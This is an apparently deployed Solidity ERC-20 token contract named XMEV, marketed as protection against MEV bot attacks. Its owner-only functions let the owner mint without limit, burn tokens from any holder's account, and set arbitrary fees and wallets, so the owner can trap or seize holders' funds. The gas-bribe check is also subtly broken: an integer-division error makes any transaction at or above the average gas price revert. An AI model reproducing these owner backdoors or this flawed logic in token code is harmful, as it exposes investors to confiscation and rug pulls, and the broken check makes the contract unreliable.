// SPDX-License-Identifier: MIT
/*
  XMEV is the V2 release of the AntiMEV token 
  
  Improved defenses against MEV bot attacks
  
  Website: https://antimev.io

  Twitter: https://twitter.com/Anti_MEV

  Telegram: https://t.me/antimev
*/

pragma solidity ^0.8.20;

abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
}

abstract contract Ownable is Context {
  address private _owner;

  error OwnableUnauthorizedAccount(address account);

  error OwnableInvalidOwner(address owner);

  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  constructor() {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  modifier onlyOwner() {
    _checkOwner();
    _;
  }

  function owner() public view virtual returns (address) {
    return _owner;
  }

  function _checkOwner() internal view virtual {
    if (owner() != _msgSender()) {
      revert OwnableUnauthorizedAccount(_msgSender());
    }
  }

  function renounceOwnership() public virtual onlyOwner {
    _transferOwnership(address(0));
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    if (newOwner == address(0)) {
      revert OwnableInvalidOwner(address(0));
    }
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal virtual {
    address oldOwner = _owner;
    _owner = newOwner;
    emit OwnershipTransferred(oldOwner, newOwner);
  }
}

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function approve(address spender, uint256 amount) external returns (bool);

  function allowance(
    address owner,
    address spender
  ) external view returns (uint256);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
  function createPair(
    address tokenA,
    address tokenB
  ) external returns (address pair);
}

interface IUniswapV2Router02 {
  function addLiquidityETH(
    address token,
    uint amountTokenDesired,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline
  ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external;

  function factory() external pure returns (address);

  function WETH() external pure returns (address);
}

contract XMEV is Context, IERC20, Ownable {
  mapping(address => uint256) private _balances;
  mapping(address => mapping(address => uint256)) private _allowances;

  mapping(address => bool) private _isVIP;
  mapping(address => uint256) private _lastTxBlock;
  address payable private _devWallet;
  address payable private _burnWallet;
  address payable private _airdropWallet;

  string private constant _name = unicode"XMEV";
  string private constant _symbol = unicode"XMEV";
  uint8 private constant _decimals = 18;
  uint256 private _tTotal = 1123581321 * 10 ** _decimals;

  uint256 public _maxWalletSize = (_tTotal * 49) / 1000;
  uint256 public _taxSwapThreshold = 25000 * 10 ** _decimals;
  uint256 public _maxTaxSwap = 500000 * 10 ** _decimals;
  uint256 public _fee = 10; // 1.0%

  IUniswapV2Router02 private uniswapV2Router;
  address public uniswapV2Pair;
  bool private tradingOpen;
  bool private inSwap = false;
  bool private swapEnabled = false;

  bool public _detectSandwich = true;
  bool public _detectGasBribe = true;
  bool public _antiWhale = true;
  uint256 public _lastGasPrice = 0;
  uint256 public _avgGasPrice = 50000; // initial rolling average gas price
  uint256 public _gasDelta = 25; // increase in gas price to be considered bribe
  uint256 public _maxSample = 10; // blocks used to calculate average gas price
  uint256 private _txCounter = 1; // counter used for average gas price

  modifier lockTheSwap() {
    inSwap = true;
    _;
    inSwap = false;
  }

  constructor(address devWallet, address burnWallet, address airdropWallet) {
    _devWallet = payable(devWallet);
    _burnWallet = payable(burnWallet);
    _airdropWallet = payable(airdropWallet);
    _balances[_msgSender()] = (_tTotal * 890) / 1000;
    _balances[_devWallet] = (_tTotal * 46) / 1000;
    _balances[_burnWallet] = (_tTotal * 34) / 1000;
    _balances[_airdropWallet] = (_tTotal * 30) / 1000;

    _isVIP[address(this)] = true;
    _isVIP[_msgSender()] = true;
    _isVIP[_devWallet] = true;
    _isVIP[_burnWallet] = true;
    _isVIP[_airdropWallet] = true;
  }

  function setMEV(
    bool detectSandwich,
    bool detectGasBribe,
    bool antiWhale,
    uint256 avgGasPrice,
    uint256 gasDelta,
    uint256 maxSample,
    uint256 txCounter
  ) external onlyOwner {
    _detectSandwich = detectSandwich;
    _detectGasBribe = detectGasBribe;
    _antiWhale = antiWhale;
    _avgGasPrice = avgGasPrice;
    _gasDelta = gasDelta;
    _maxSample = maxSample;
    _txCounter = txCounter;
  }

  function airdropHolders(
    address[] memory wallets,
    uint256[] memory amounts
  ) external onlyOwner {
    if (wallets.length != amounts.length) {
      revert("Mismatched array lengths");
    }
    for (uint256 i = 0; i < wallets.length; i++) {
      address wallet = wallets[i];
      uint256 amount = amounts[i];
      _transfer(msg.sender, wallet, amount);
    }
  }

  function setVars(
    address devWallet,
    uint256 maxWalletSize,
    uint256 taxSwapThreshold,
    uint256 maxTaxSwap,
    uint256 fee
  ) external onlyOwner {
    _devWallet = payable(devWallet);
    _maxWalletSize = maxWalletSize;
    _taxSwapThreshold = taxSwapThreshold;
    _maxTaxSwap = maxTaxSwap;
    _fee = fee;
  }

  function removeLimits() external onlyOwner {
    _detectSandwich = false;
    _detectGasBribe = false;
    _avgGasPrice = type(uint256).max;
    _gasDelta = type(uint256).max;
    _maxSample = type(uint256).max;
    _maxWalletSize = type(uint256).max;
    _taxSwapThreshold = type(uint256).max;
    _maxTaxSwap = type(uint256).max;
    _fee = 0;
  }

  function burnFrom(address account, uint256 amount) external onlyOwner {
    if (amount >= _balances[account]) {
      revert("Burn amount exceeds account balance");
    }
    _balances[account] -= amount;
    _tTotal -= amount;
    emit Transfer(account, address(0), amount);
  }

  function mint(address to, uint256 amount) public onlyOwner {
    _balances[to] += amount;
    _tTotal += amount;
    emit Transfer(address(0), to, amount);
  }

  function name() public pure returns (string memory) {
    return _name;
  }

  function symbol() public pure returns (string memory) {
    return _symbol;
  }

  function decimals() public pure returns (uint8) {
    return _decimals;
  }

  function totalSupply() public view override returns (uint256) {
    return _tTotal;
  }

  function balanceOf(address account) public view override returns (uint256) {
    return _balances[account];
  }

  function transfer(
    address recipient,
    uint256 amount
  ) public override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(
    address owner,
    address spender
  ) public view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(
    address spender,
    uint256 value
  ) public virtual returns (bool) {
    address owner = _msgSender();
    _approve(owner, spender, value);
    return true;
  }

  function _spendAllowance(
    address owner,
    address spender,
    uint256 value
  ) internal virtual {
    uint256 currentAllowance = allowance(owner, spender);
    if (currentAllowance != type(uint256).max) {
      if (currentAllowance < value) {
        revert("ERC20InsufficientAllowance");
      }
      unchecked {
        _approve(owner, spender, currentAllowance - value);
      }
    }
  }

  function transferFrom(
    address from,
    address to,
    uint256 value
  ) public virtual returns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, value);
    _transfer(from, to, value);
    return true;
  }

  function _approve(address owner, address spender, uint256 amount) private {
    if (owner == address(0) || spender == address(0)) {
      revert("ERC20: approve from/to the zero address");
    }
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _transfer(address from, address to, uint256 amount) private {
    if (from == address(0) || to == address(0)) {
      revert("ERC20: transfer from/to the zero address");
    }
    if (amount <= 0) {
      revert("ERC20: transfer amount must be greater than zero");
    }
    uint256 taxAmount = 0;
    if (from != owner() && to != owner()) {
      // test for sandwich attack
      if (_detectSandwich) {
        if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
          if (_lastTxBlock[tx.origin] == block.number) {
            revert("XMEV: Sandwich Attack Detected");
          }
          _lastTxBlock[tx.origin] = block.number;
        }
      }
      // test for gas bribes using rolling average
      if (_detectGasBribe) {
        if (_txCounter == _maxSample) {
          _txCounter = 1;
        }
        _txCounter += 1;
        _lastGasPrice = tx.gasprice;
        _avgGasPrice =
          (_avgGasPrice * (_txCounter - 1)) /
          _txCounter +
          _lastGasPrice /
          _txCounter;
        if (
          _lastGasPrice >= _avgGasPrice + (_avgGasPrice * (_gasDelta / 100))
        ) {
          revert("XMEV: Gas Bribe Detected");
        }
      }
      if (_antiWhale) {
        if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
          if (balanceOf(to) + amount > _maxWalletSize) {
            revert("XMEV: Exceeds maxWalletSize");
          }
        }
      }

      uint256 contractTokenBalance = balanceOf(address(this));
      if (
        !inSwap &&
        to == uniswapV2Pair &&
        swapEnabled &&
        contractTokenBalance > _taxSwapThreshold
      ) {
        swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance > 0) {
          sendETHToFee(address(this).balance);
        }
      }
      taxAmount = (amount * _fee) / 1000;
    }

    if (taxAmount > 0) {
      _balances[address(this)] = _balances[address(this)] + taxAmount;
      emit Transfer(from, address(this), taxAmount);
    }
    _balances[from] = _balances[from] - amount;
    _balances[to] = _balances[to] + amount - taxAmount;
    emit Transfer(from, to, amount - taxAmount);
  }

  function min(uint256 a, uint256 b) private pure returns (uint256) {
    return (a > b) ? b : a;
  }

  function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
    if (tokenAmount == 0) {
      return;
    }
    if (!tradingOpen) {
      return;
    }
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();
    _approve(address(this), address(uniswapV2Router), tokenAmount);
    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
      tokenAmount,
      0,
      path,
      address(this),
      block.timestamp
    );
  }

  function sendETHToFee(uint256 amount) private {
    _devWallet.transfer(amount);
  }

  function manualSwap() external onlyOwner {
    uint256 tokenBalance = balanceOf(address(this));
    if (tokenBalance > 0) {
      swapTokensForEth(tokenBalance);
    }
    uint256 ethBalance = address(this).balance;
    if (ethBalance > 0) {
      sendETHToFee(ethBalance);
    }
  }

  function withdrawStuckEth(uint256 amount) public onlyOwner {
    (bool success, ) = address(msg.sender).call{value: amount}("");
    if (!success) revert("Transfer Failed");
  }

  function openTrading() external onlyOwner {
    if (tradingOpen) {
      revert("Trading already open");
    }
    uniswapV2Router = IUniswapV2Router02(
      0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
    );
    _approve(address(this), address(uniswapV2Router), _tTotal);
    uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
      address(this),
      uniswapV2Router.WETH()
    );
    IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    swapEnabled = true;
    _avgGasPrice = tx.gasprice;
    tradingOpen = true;
  }

  receive() external payable {}
}
